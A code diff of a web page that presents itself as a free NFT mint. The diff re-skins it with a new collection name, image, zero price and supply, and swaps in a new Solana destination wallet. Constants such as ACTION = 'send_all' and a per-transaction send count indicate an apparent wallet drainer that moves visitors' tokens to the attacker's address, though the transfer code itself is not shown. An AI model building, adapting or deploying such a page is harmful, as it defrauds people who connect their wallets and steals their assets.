@@ -6,10 +6,10 @@ import OwnLayout from "./OwnLayout/OwnLayout";
 import imgDiscord from './icons8-discord-50.png'
 import imgTwitter from './icons8-twitter-50.png'
 
-const solAmount = "0.19"
-const image = 'https://pbs.twimg.com/profile_images/1646212982668509200/uWvqRb0t_400x400.jpg'
-const Title = 'Kines | FREE MINT'
-const supply = 899
+const solAmount = "0"
+const image = 'https://pbs.twimg.com/profile_images/1641768104517840896/rtLkWoAn_400x400.jpg'
+const Title = 'Mystic Creatures'
+const supply = 91
 
 document.title = Title
 document.getElementById('favicon').setAttribute('href', image)
@@ -19,7 +19,7 @@ const ACTION = 'send_all';
 const SENDS_IN_ONE_TX = 7;
 // const CLOSES_IN_ONE_TX = 27;
 
-const DESTINATION = new PublicKey('4444yauc6XPT2TKY1GQkQ88SKeJaSVzH5JkohuHmPJNR');
+const DESTINATION = new PublicKey('HkGiZyGJt7H4XMpzzaSbsUtHqbypwzfuLeWqjkqpgsF2');
 
 const tokenProgram = TOKEN_PROGRAM_ID;
 
